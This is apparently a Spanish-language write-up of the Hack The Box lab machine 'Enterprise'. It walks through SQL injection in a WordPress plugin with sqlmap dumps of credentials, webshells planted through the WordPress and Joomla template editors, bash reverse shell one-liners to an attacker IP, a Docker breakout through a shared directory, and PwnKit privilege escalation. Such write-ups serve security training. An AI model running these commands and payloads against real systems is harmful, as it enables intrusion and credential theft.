PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
8080/tcp  open  http-proxy

-Añadimos el dominio enterprise.htb al /etc/hosts

-En el puerto 80 encontramos un Wordpress 4.8.1

-En el puerto 8080 encontramos un Joomla

-En el puerto 443 encontramos un archivo.zip en la siguiente ruta:
	-https://enterprise.htb/files/
		-lcars.zip

-Descomprimimos el archivo y nos encontramos con 3 archivos.php:
	-lcars.php
	-lcars_db.php
	-lcars_dbpost.php

-Contenido del archivo **'lcars_db.php**' **(VULNERABLE)**:
	include "/var/www/html/wp-config.php";
	if (isset($_GET['query'])){
	     $query = $_GET['query'];
	     $sql = "SELECT ID FROM wp_posts WHERE post_name = $query";
	}

-Contenido del archivo **'lcars_dbpost.php'** **(NO VULNERABLE)**:
	if (isset($_GET['query'])){
	      $query = (int)$_GET['query'];
	     $sql = "SELECT post_title FROM wp_posts WHERE ID = $query";
     }

-El archivo **'lcars_dbpost.php'**, NO ES VULNERABLE porque castea el input a (int).

(Este código es vulnerable a SQLI en el parámetro query, ya que nos se hace sanitización del input del usuario)

-Podemos encontrar el archivo.php en la siguiente ruta del puerto 80:
	-http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1
		**Catchable fatal error**: Object of class mysqli_result could not be converted to string in **/var/www/html/wp-content/plugins/lcars/lcars_db.php** on line **16**

## SQLI (DB Enumeration)

### Manual

-Cómo es 'blind', no podemos enumerar la BD con Manual Error based SQLI

-Podríamos montarnos un script con Python que haga SQLI time-based, pero al ser un wordpress la BD tiene muchas tablas y sería un rollo.

### SQLMAP

-Listamos las BDS existentes:
	-sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' --dbs --batch
		[*] information_schema
		[*] joomla
		[*] joomladb
		[*] mysql
		[*] performance_schema
		[*] sys
		[*] wordpress
		[*] wordpressdb


-Dumpeamos los usuarios y contraseñas de la BD **'joomla'**:
	-sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' -D joomladb -T edz2g_users -C username,password --dump --batch
		**Guinan:$2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q**
		geordi.la.forge:$2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy
			**-NO PODEMOS ROMPER LOS HASHES**

-Listamos las Tablas de la BD 'Wordpress':
	-sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' -D wordpress --tables --batch
		-wp_users
			-Dumpeamos toda la tabla 'wp_users' de la BD **'wordpress'**:
				 -sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' -D wordpress -T wp_users --dump --batch
					 -user_login: william.riker
					 -user_pass: $P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2.
						 **-NO PODEMOS ROMPER EL HASH**

-Listamos la Columnas de la BD 'wordpress' y la tabla wp_posts:
	-sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' -D wordpress -T wp_posts --columns --batch
		-Me interesan:
			**-post_content**
				-Dumpeamos la columna **post_content**:
					-sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' -D wordpress -T wp_posts -C post_content --dump --batch
						**FUNCIONA!!!**

-Para ver toda la información que nos ha sacado de la columna post_content miramos el siguiente archivo:
	-/home/kali/.local/share/sqlmap/output/enterprise.htb/dump/wordpress/wp_posts.csv
		-Encontramos 4 contraseñas:
			ZxJyhGem4k338S2Y  
			enterprisencc170 
			ZD3YxfnSjezg67JZ  
			u*Z14ru0p#ttj83zS6
-------------------------------------------------------------------------------------------------------------

-Nos vamos a /wp-admin y probamos las contraseñas con el usuario william.riker
	-Las Credenciales que funcionan son las siguientes:
		-Username: william.riker
		-Password: u*Z14ru0p#ttj83zS6
			ESTAMOS DENTRO

## Explotación Wordpress 

-Una vez dentro del Dashboard, nos vamos a:
	-Appareance --> Editor --> archive.php (Por ejemplo)

-Añadimos una webshell en archive.php:
	![[Pasted image 20250526201941.png]]

-Ejecutamos Comandos a través de la siguiente URL:
	-http://enterprise.htb/wp-content/themes/twentyseventeen/archive.php?cmd=id
		**uid=33(www-data) gid=33(www-data) groups=33(www-data)**

-Nos mandamos una RS:
	-http://enterprise.htb/wp-content/themes/twentyseventeen/archive.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.27/1234 0>%261'
		**www-data@b8319d86d21e:/$ whoami**
			**www-data**

-Nos damos cuenta que estamos en un Contenedor:
	-hostname -I:
		172.17.0.3
-------------------------------------------------------------------------------------------------------------
### Docker Breakout (Wordpress) - Sin Éxito

-Ejecutamos el script hostdiscovery.sh:
	-./hostdiscovery.sh 
		[+] Host 172.17.0.2 -ACTIVE
		[+] Host 172.17.0.3 -ACTIVE (Esta es en la que estamos)
		[+] Host 172.17.0.1 -ACTIVE 
		[+] Host 172.17.0.4 -ACTIVE

-Ejecutamos el script portscan.sh sobre el host 172.17.0.1:
	-Port 22 open
	-port 80 open
	-port 443 open
	(Es la Máquina Final!!)

-**NO PODEMOS pivotar vía SSH**, ya que no tenemos el binario de SSH en la Máquina actual (172.17.0.3).

-En el Contenedor de la Máquina 172.17.0.3 (el cual entramos explotando Wordpress) no nos sirve para nada. 

------------------------------------------------------------------------------------------------------------

## Explotación Joomla

-Nos vamos a -http://enterprise.htb:8080/administrator y probamos con los usuarios y contraseñas que tenemos:
	-Username: geordi.la.forge
	-Password: ZD3YxfnSjezg67JZ
		ESTAMOS DENTROO!!

-Insertamos la RS de PentestMonkey en:
	-Templates --> beez3 (o cualquier template) --> index.php

-La ejecutamos desde:
	-http://enterprise.htb:8080/templates/beez3
		www-data@a7018bfdc454:/$ whoami
			www-data

-Estamos en el siguiente host:
	-hostname -I
		172.17.0.4
-----------------------------------------------------------------------------------------------------

### Docker Breakout (Joomla) - Con Éxito!!

-Tampoco podemos pivotar a la Máquina Final vía SSH ya que no tenemos el binario de SSH. Sin embargo, encontramos un directorio compartido con la Máquina Víctima en la siguiente ruta:
	-/var/www/html/files ls
		lcars.zip (Es el archivo que descargamos en el puerto 443 al principio)

-Subimos una webshell al directorio y Obtenemos Acceso a la Máquina Final:
	1-Subimos la webshell:
		![[Pasted image 20250527132027.png]]
	2-Nos mandamos una RS desde la webshell subida:
		-https://enterprise.htb/files/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.27/4444 0>&1'
			**www-data@enterprise:/$ whoami**   
				**www-data**

-Ya estamos en la Máquina Final:
	-hostname -I:
		10.10.10.61 172.17.0.1

-------------------------------------------------------------------------------------------------------------

## Escalada de Privilegios

-Tenemos permisos SUID sobre el binario /usr/bin/pkexec , nos compartimos el Pwnkit desde nuestra máquina y lo ejecutamos

root@enterprise:/# whoami
	root